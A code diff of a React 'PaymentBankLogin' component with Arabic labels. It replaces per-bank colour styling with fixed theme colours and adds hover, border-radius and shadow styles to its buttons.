@@ -286,7 +286,7 @@ const PaymentBankLogin = () => {
       <div 
         className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
         }}
       >
         <div 
@@ -435,7 +435,7 @@ const PaymentBankLogin = () => {
           <button
             type="button"
             className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || colors.primary }}
+            style={{ color: colors.primary }}
           >
             نسيت كلمة المرور؟
           </button>
@@ -445,10 +445,12 @@ const PaymentBankLogin = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
+          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg hover:opacity-90 transition-all"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || colors.primary}, ${selectedBank?.color || colors.secondary})`
+            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
+            borderRadius: '12px',
+            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
           }}
         >
           {isSubmitting ? (
@@ -477,7 +479,7 @@ const PaymentBankLogin = () => {
           variant="outline"
           size="sm"
           className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
+          style={{ borderColor: colors.primary, color: colors.primary }}
         >
           تسجيل حساب جديد
         </Button>
